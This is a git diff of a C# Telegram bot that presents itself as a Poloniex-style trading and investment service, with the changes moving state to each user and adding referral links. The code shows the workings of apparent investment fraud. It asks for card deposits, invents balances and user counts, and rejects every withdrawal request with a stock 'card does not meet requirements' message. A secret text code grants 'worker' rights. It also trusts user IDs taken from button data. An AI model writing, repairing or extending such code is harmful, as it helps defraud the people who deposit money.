@@ -1,15 +1,18 @@
 ﻿using Newtonsoft.Json;
+using System.ComponentModel.DataAnnotations;
 using System.Linq;
 using System.Text;
 using System.Threading;
 using Telegram.Bot;
 using Telegram.Bot.Exceptions;
 using Telegram.Bot.Polling;
+using Telegram.Bot.Requests;
 using Telegram.Bot.Requests.Abstractions;
 using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.InlineQueryResults;
 using Telegram.Bot.Types.ReplyMarkups;
+using static System.Net.Mime.MediaTypeNames;
 
 TGBot telegramBot = new TGBot();
 await telegramBot.Main();
@@ -28,7 +31,13 @@ class UserData
     // Кто есть кто
     public bool IsWorker { get; set; }
     public bool IsAdmin { get; set; }
-    public List<UserData> Refferals { get; set; }
+    public List<long> Refferals { get; set; }
+
+    public bool waitSumWithdraw = false;
+    public bool waitRequisites = false;
+    public bool waitSumInvestment = false;
+    public bool waitUpdateBetThread = false;
+    public Message idMessage = null;
 
     public string Username { get; set; }
     public long Id { get; set; }
@@ -46,21 +55,15 @@ class UserData
         ShowedChangeDirection = "вниз";
         InvestmentAmount = 0;
         Status = "RANDOM";
-        Refferals = new List<UserData>();
+        Refferals = new List<long>();
     }
 }
 
 class TGBot
 {
-    Message idMessage = null;
     ITelegramBotClient botClient;
 
     Random random = new Random();
-
-    bool waitSumWithdraw = false;
-    bool waitRequisites = false;
-    bool waitSumInvestment = false;
-    bool waitUpdateBetThread = false;
 
     List<UserData> users;
 
@@ -167,141 +170,126 @@ class TGBot
             var chatId = message.Chat.Id;
             var user = USER(chatId);
 
-            if (message.Text.StartsWith("/start") && !waitUpdateBetThread)
+            if (message.Text.StartsWith("/start") && !user.waitUpdateBetThread)
             {
-                DisableChecks();
+                DisableChecks(user);                
 
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                 });                
 
                 if(!user.IsWorker)
                 {
                     inlineKeyboard = new(new[]{
-                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", "createECNAccount") },
-                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", "deposit") },
-                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", "withdraw") },
-                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", "techSupport") }
+                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
+                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
+                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
+                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") }
                     });
                 }
                 else
                 {
                     inlineKeyboard = new(new[]{
-                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", "createECNAccount") },
-                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", "deposit") },
-                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", "withdraw") },
-                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", "techSupport") },
-                        new [] { InlineKeyboardButton.WithCallbackData("Панель админа/работника", "workerAdminPanel") }
+                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
+                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
+                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
+                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") },
+                        new [] { InlineKeyboardButton.WithCallbackData("Панель админа/работника", $"{user.Id}workerAdminPanel") }
                     });
-                }                
+                }
 
-                // ДОДЕЛАТЬ КОД! ЧЕРЕЗ ССЫЛКУ В СТАРТ ПЕРЕДАЕТСЯ АЙДИШНИК РЕФЕРАЛА! 
+                SendMessageWithButtons(user, cancellationToken, $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}", inlineKeyboard);
 
-                idMessage = await botClient.SendTextMessageAsync(
-                    chatId: chatId,
-                    text: $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                if (message.Text.Length > 6)
+                {
+                    string yourRefferal = message.Text.Substring(7);
+                    var yourRefferalData = USER(long.Parse(yourRefferal));
+
+                    if (!yourRefferalData.Refferals.Contains(user.Id))
+                    {
+                        yourRefferalData.Refferals.Add(user.Id);
+
+                        SendMessage(user, cancellationToken, $"Теперь вы реферал пользователя @{yourRefferalData.Username}");
+
+                        SaveData();
+                    }
+                }
             }
             else if(message.Text == "YlIl+svO|N")
             {
-                if(!user.IsWorker)
+                InlineKeyboardMarkup inlineKeyboard = new(new[]{
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
+                     });
+
+                if (!user.IsWorker)
                 {
                     user.IsWorker = true;
                     SaveData();
 
-                    idMessage = await botClient.SendTextMessageAsync(
-                    chatId: chatId,
-                    text: "Теперь у вас есть права воркера! /start",
-                    cancellationToken: cancellationToken);
+                    SendMessageWithButtons(user, cancellationToken, "Теперь у вас есть права воркера!", inlineKeyboard);
                 }
                 else
                 {
                     user.IsWorker = false;
                     SaveData();
 
-                    idMessage = await botClient.SendTextMessageAsync(
-                    chatId: chatId,
-                    text: "У вас больше нет прав воркера! /start",
-                    cancellationToken: cancellationToken);
+                    SendMessageWithButtons(user, cancellationToken, "У вас больше нет прав воркера!", inlineKeyboard);
                 }
             }
-            else if (waitSumWithdraw)
+            else if (user.waitSumWithdraw)
             {
                 double sum;
                 if (double.TryParse(message.Text, out sum) && sum <= user.Balance && sum >= 5000)
                 {
-                    waitSumWithdraw = false;
-                    waitRequisites = true;
+                    user.waitSumWithdraw = false;
+                    user.waitRequisites = true;
 
                     InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                      });
 
-                    idMessage = await botClient.EditMessageTextAsync(
-                        chatId: idMessage.Chat.Id,
-                        messageId: idMessage.MessageId,
-                        text: $"❕ Вывод возможен только на реквизиты с которых пополнялся Ваш баланс.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.",
-                        replyMarkup: inlineKeyboard,
-                        parseMode: ParseMode.Html,
-                        cancellationToken: cancellationToken);
+                    SendMessageWithButtons(user, cancellationToken, $"❕ Вывод возможен только на реквизиты с которых пополнялся Ваш баланс.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.", inlineKeyboard);
                 } 
                 else
                 {
                     InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                 });
 
-                    await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);
+                    //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);
                     await botClient.DeleteMessageAsync(chatId, message.MessageId);
 
-                    idMessage = await botClient.SendTextMessageAsync(
-                        chatId: idMessage.Chat.Id,
-                        text: $"<b>❗️ Cумма для вывода не должна:</b>\n▪️ Занижать минимально-допустимую.\n▪️ Превышать ваш баланс.\n\n💰 На вашем балансе: <i>{user.Balance} ₽</i>\n\n💬 Отправьте сообщение с суммой для вывода.",
-                        replyMarkup: inlineKeyboard,
-                        parseMode: ParseMode.Html,
-                        cancellationToken: cancellationToken);
+                    SendMessageWithButtons(user, cancellationToken, $"<b>❗️ Cумма для вывода не должна:</b>\n▪️ Занижать минимально-допустимую.\n▪️ Превышать ваш баланс.\n\n💰 На вашем балансе: <i>{user.Balance} ₽</i>\n\n💬 Отправьте сообщение с суммой для вывода.", inlineKeyboard);
                 }
             }
-            else if(waitRequisites)
+            else if(user.waitRequisites)
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                 });
 
-                await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);
+                //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);
                 await botClient.DeleteMessageAsync(chatId, message.MessageId);
 
-                idMessage = await botClient.SendTextMessageAsync(
-                    chatId: idMessage.Chat.Id,
-                    text: $"❌ Введённая карта несоответсвует требованиям.\n❕ Вывод возможен только на реквизиты с которых осуществлялось пополнение.\n❕ Карта должна быть действительной.\n❕ Банк должен быть доступен.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, $"❌ Введённая карта несоответсвует требованиям.\n❕ Вывод возможен только на реквизиты с которых осуществлялось пополнение.\n❕ Карта должна быть действительной.\n❕ Банк должен быть доступен.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.", inlineKeyboard);
             }
-            else if(waitSumInvestment)
+            else if(user.waitSumInvestment)
             {
-                waitSumInvestment = false;
+                user.waitSumInvestment = false;
 
                 double sum;
                 if (double.TryParse(message.Text, out sum) && sum <= user.Balance && sum >= 500) user.InvestmentAmount = sum;
 
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                     new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", "betChangeDirection") },
-                     new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", "enterSumInvestment") },
-                     new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", "createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", "betAccept") }
+                     new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", $"{user.Id}betChangeDirection") },
+                     new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", $"{user.Id}enterSumInvestment") },
+                     new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", $"{user.Id}betAccept") }
                  });
 
-                await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);
+                //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);
                 await botClient.DeleteMessageAsync(chatId, message.MessageId);
 
-                idMessage = await botClient.SendTextMessageAsync(
-                    chatId: message.Chat.Id,
-                    text: $"Ваш баланс: {user.Balance} ₽\n<i>Минимальная сумма инвестиции: <b>500 ₽</b></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыбранные активы: {user.SelectedAsset}\n\nВведённая сумма инвестиции: <b>{user.InvestmentAmount} ₽</b>\nПредположеное направление курса: {user.CourseDirection[user.CourseDirection.Length-1]}",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, $"Ваш баланс: {user.Balance} ₽\n<i>Минимальная сумма инвестиции: <b>500 ₽</b></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыбранные активы: {user.SelectedAsset}\n\nВведённая сумма инвестиции: <b>{user.InvestmentAmount} ₽</b>\nПредположеное направление курса: {user.CourseDirection[user.CourseDirection.Length - 1]}", inlineKeyboard);
             }
             else
             {
@@ -312,20 +300,24 @@ class TGBot
         if (update.CallbackQuery is { } callbackQuery)
         {
             var callbackData = callbackQuery.Data; // Текст который вернула инлайн-кнопка
+            //Environment.Exit(0);
+            var user = USER(long.Parse(callbackData[..9]));
+            //var user = USER(409013849);
+            
 
-            if (idMessage != null)
+            if (user.idMessage != null)
             {
-                SendButtons(botClient, idMessage, cancellationToken, callbackData);
+                SendButtons(botClient, user.idMessage, cancellationToken, callbackData[9..]);
             }
         }
     }
 
-    void DisableChecks()
+    void DisableChecks(UserData user)
     {
-        waitSumWithdraw = false;
-        waitRequisites = false;
-        waitSumInvestment = false;
-        waitUpdateBetThread = false;
+        user.waitSumWithdraw = false;
+        user.waitRequisites = false;
+        user.waitSumInvestment = false;
+        user.waitUpdateBetThread = false;
     }
 
     async void SendButtons(ITelegramBotClient botClient, Message message, CancellationToken cancellationToken, string type)
@@ -337,52 +329,33 @@ class TGBot
         {
             if (type == "loadMenu")
             {
-                DisableChecks();
+                DisableChecks(user);
 
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: "loadMenu") }
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: $"{user.Id}loadMenu") }
                 });
 
                 if (!user.IsWorker)
                 {
                     inlineKeyboard = new(new[]{
-                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", "createECNAccount") },
-                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", "deposit") },
-                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", "withdraw") },
-                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", "techSupport") }
+                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
+                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
+                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
+                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") }
                     });
                 }
                 else
                 {
                     inlineKeyboard = new(new[]{
-                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", "createECNAccount") },
-                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", "deposit") },
-                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", "withdraw") },
-                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", "techSupport") },
-                        new [] { InlineKeyboardButton.WithCallbackData("Панель админа/работника", "workerAdminPanel") }
+                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
+                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
+                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
+                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") },
+                        new [] { InlineKeyboardButton.WithCallbackData("Панель админа/работника", $"{user.Id}workerAdminPanel") }
                     });
-                }                
-
-                if (idMessage != null)
-                {
-                    idMessage = await botClient.EditMessageTextAsync(
-                        chatId: message.Chat.Id,
-                        messageId: idMessage.MessageId,
-                        text: $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {message.Chat.Id}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()} {user.DateOfRegister.ToLongTimeString()}",
-                        replyMarkup: inlineKeyboard,
-                        parseMode: ParseMode.Html,
-                        cancellationToken: cancellationToken);
-                }
-                else
-                {
-                    idMessage = await botClient.SendTextMessageAsync(
-                       chatId: message.Chat.Id,
-                       text: $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {message.Chat.Id}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()} {user.DateOfRegister.ToLongTimeString()}",
-                       replyMarkup: inlineKeyboard,
-                       parseMode: ParseMode.Html,
-                       cancellationToken: cancellationToken);
                 }
 
+                SendMessageWithButtons(user, cancellationToken, $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {message.Chat.Id}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()} {user.DateOfRegister.ToLongTimeString()}", inlineKeyboard);
             }
             else if(type.Length > 8 && type[..8] == "withdraw")
             {
@@ -391,49 +364,31 @@ class TGBot
                 else if (selectedPaymentSystem == "QIWI") selectedPaymentSystem = "QIWI 🥝";
                 else selectedPaymentSystem = "Банк 🇧🇾";
 
-                waitSumWithdraw = true;
+                user.waitSumWithdraw = true;
 
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                 });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: $"💰 <b>Ваш баланс: <i>{user.Balance} ₽</i></b>\n<i>Выбранная система: {selectedPaymentSystem}</i>\n\n❕ Минимальная сумма для вывода: <i><u>5000 ₽</u></i>\n\n💬 Отправьте сообщение с суммой для вывода.",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, $"💰 <b>Ваш баланс: <i>{user.Balance} ₽</i></b>\n<i>Выбранная система: {selectedPaymentSystem}</i>\n\n❕ Минимальная сумма для вывода: <i><u>5000 ₽</u></i>\n\n💬 Отправьте сообщение с суммой для вывода.", inlineKeyboard);
             }
             else if(type == "withdraw")
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                new[] { InlineKeyboardButton.WithCallbackData("💳 Банковская карта", callbackData: "withdrawBankCard"), InlineKeyboardButton.WithCallbackData(text: "🥝 QIWI Wallet", callbackData: "withdrawQIWI") },
-                new[] {InlineKeyboardButton.WithCallbackData(text: "🇧🇾 Беларусская карта", "withdrawBelarussianCard") },
-                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: "loadMenu") }
+                new[] { InlineKeyboardButton.WithCallbackData("💳 Банковская карта", callbackData: $"{user.Id}withdrawBankCard"), InlineKeyboardButton.WithCallbackData(text: "🥝 QIWI Wallet", callbackData: $"{user.Id}withdrawQIWI") },
+                new[] {InlineKeyboardButton.WithCallbackData(text: "🇧🇾 Беларусская карта", $"{user.Id}withdrawBelarussianCard") },
+                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: $"{user.Id}loadMenu") }
             });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: "🖨 Выберите на какую систему будет произведён вывод средств.",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, "🖨 Выберите на какую систему будет произведён вывод средств.", inlineKeyboard);
             }
             else if(type == "deposit")
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: "loadMenu") }
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: $"{user.Id}loadMenu") }
                 });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: $"✅ Минимальная сумма пополнения: <i><u>5000 ₽</u></i>\n\n🥝 Номер карты для QIWI: <code>Недоступно</code> ( <i>До 10000 ₽</i> )\n💳 Номер карты для банка: <code>Недоступно</code>\n\n📝 Комментарий при переводе: <code>@{user.Username}</code>\n\n❕ Пополнение доступно для жителей Беларуси, через техническую поддержку ( @Poloniexx_support ).\n\n❕ Если нет возможности оставить комментарий или Вы ошиблись с указанием комментария, отправьте чек в техническую поддержку ( @Poloniexx_support ).\n\n✳️ Средства пополняются автоматически, время обработки до 5 минут.",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, $"✅ Минимальная сумма пополнения: <i><u>5000 ₽</u></i>\n\n🥝 Номер карты для QIWI: <code>Недоступно</code> ( <i>До 10000 ₽</i> )\n💳 Номер карты для банка: <code>Недоступно</code>\n\n📝 Комментарий при переводе: <code>@{user.Username}</code>\n\n❕ Пополнение доступно для жителей Беларуси, через техническую поддержку ( @Poloniexx_support ).\n\n❕ Если нет возможности оставить комментарий или Вы ошиблись с указанием комментария, отправьте чек в техническую поддержку ( @Poloniexx_support ).\n\n✳️ Средства пополняются автоматически, время обработки до 5 минут.", inlineKeyboard);
             }
             else if (type == "createECNAccount")
             {
@@ -441,28 +396,18 @@ class TGBot
                 user.SelectedAsset = string.Empty;
 
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                new[] { InlineKeyboardButton.WithCallbackData(text: "™️ Акционные активы", callbackData: "assetsEquity"), InlineKeyboardButton.WithCallbackData("💶 Фиатные активы", callbackData: "assetsFiat") },
-                new[] {InlineKeyboardButton.WithCallbackData(text: "👛 Криптовалюта", "assetsCrypto") },
-                new[] {InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся в главное меню", "loadMenu") }
+                new[] { InlineKeyboardButton.WithCallbackData(text: "™️ Акционные активы", callbackData: $"{user.Id}assetsEquity"), InlineKeyboardButton.WithCallbackData("💶 Фиатные активы", callbackData: $"{user.Id}assetsFiat") },
+                new[] {InlineKeyboardButton.WithCallbackData(text: "👛 Криптовалюта", $"{user.Id}assetsCrypto") },
+                new[] {InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
             });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: "💶 Фиатные - Физическая валюта.\n™️ Акционные - Акции компаний.\n👛 Криптовалюта - Вид цифровой валюты.\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n<b>Выберите категорию активов.</b>",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, "💶 Фиатные - Физическая валюта.\n™️ Акционные - Акции компаний.\n👛 Криптовалюта - Вид цифровой валюты.\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n<b>Выберите категорию активов.</b>", inlineKeyboard);
             }
             else if(type == "enterSumInvestment")
             {
-                waitSumInvestment = true;
+                user.waitSumInvestment = true;
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: message.Chat.Id,
-                    messageId: message.MessageId,
-                    text: "Отправьте сумму для инвестиции.",
-                    cancellationToken: cancellationToken);
+                SendMessage(user, cancellationToken, "Отправьте сумму для инвестиции.");
             }
             else if(type.Length > 3 && type[..3] == "bet")
             {
@@ -490,156 +435,153 @@ class TGBot
                 if (type[3..] != "Accept")
                 {
                     InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", "betChangeDirection") },
-                    new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", "enterSumInvestment") },
-                    new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", "createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", "betAccept") }
+                    new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", $"{user.Id}betChangeDirection") },
+                    new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", $"{user.Id}enterSumInvestment") },
+                    new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", $"{user.Id}betAccept") }
                 });
 
                     string mess = $"Ваш баланс: {user.Balance} ₽\n<i>Минимальная сумма инвестиции: <b>500 ₽</b></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыбранные активы: {user.SelectedAsset}\n\nВведённая сумма инвестиции: <b>{user.InvestmentAmount} ₽</b>\nПредположеное направление курса: {user.CourseDirection[user.CourseDirection.Length-1]}";
 
-                    await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);
+                    //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);
 
-                    idMessage = await botClient.SendTextMessageAsync(
-                        chatId: message.Chat.Id,
-                        text: successfully ? mess : "‼️Депозит должен быть больше или равен минимальному‼️\n\n" + mess,
-                        replyMarkup: inlineKeyboard,
-                        parseMode: ParseMode.Html,
-                        cancellationToken: cancellationToken);
+                    SendMessageWithButtons(user, cancellationToken, successfully ? mess : "‼️Депозит должен быть больше или равен минимальному‼️\n\n" + mess, inlineKeyboard);
                 }                
             }
             else if (type.Length > 6 && type[..6] == "assets")
             {
-                InlineKeyboardMarkup inlineKeyboard = new(new[] { new[] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") } });
+                InlineKeyboardMarkup inlineKeyboard = new(new[] { new[] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") } });
 
                 if (type[6..] == "Fiat")
                 {
                     inlineKeyboard = new(new[]{
-                    new[] { InlineKeyboardButton.WithCallbackData($"USD {GetForecast()}", "betUSD"), InlineKeyboardButton.WithCallbackData($"EUR {GetForecast()}",  "betEUR") },
